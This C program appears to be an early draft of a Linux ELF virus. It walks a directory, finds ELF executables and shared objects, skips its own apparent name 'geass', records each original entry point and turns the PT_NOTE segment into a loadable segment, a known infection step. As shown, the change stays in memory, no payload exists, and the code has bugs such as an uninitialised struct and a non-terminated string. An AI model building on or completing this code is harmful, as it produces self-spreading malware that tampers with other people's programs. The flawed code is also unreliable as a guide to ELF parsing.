#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <string.h>
#include <dirent.h>
#include <ftw.h>

int checkifElf(Elf64_Ehdr elfHeader){
    unsigned char *fileMagicNumbers = elfHeader.e_ident;

    if(fileMagicNumbers[1] == 'E' && fileMagicNumbers[2] == 'L' && fileMagicNumbers[3] == 'F'){
        return 0;
    }

    return 1;
}

int walkDirectory(const char *filename, const struct stat *statptr, int fileflags){
    FILE *filePointer;
    Elf64_Ehdr elfHeader;
    int result;
    long unsigned int originalEntryPoint;
    
    filePointer = fopen(filename, "rb");
    fread(&elfHeader, sizeof(elfHeader), 1, filePointer);

    result = checkifElf(elfHeader);
    if(result == 0 && elfHeader.e_type == 3 && strstr(filename, "geass") == NULL){
        printf("[*] %s is an Executable ELF file!\n", filename);
        printf("\tEntry Point: 0x%lx\n", elfHeader.e_entry);

        originalEntryPoint = elfHeader.e_entry;

        Elf64_Phdr elfSegment;
        while(elfSegment.p_type != 4){
            fread(&elfSegment, sizeof(elfSegment), 1, filePointer);
        }

        elfSegment.p_type = 1;
        if(elfSegment.p_type == 1){
            printf("\tPT_NOTE segment Updated to PT_LOAD segment\n");
        }
    }

    return 0;
}

int main(int argc, char *argv[]){
    char directoryName[strlen(argv[1])];
    int result;

    //verify argc is two

    memcpy(directoryName, argv[1], strlen(argv[1]));
    printf("[*] Scanning Directory: %s\n", directoryName);

    result = ftw(directoryName, walkDirectory, 2);

    return 0;
}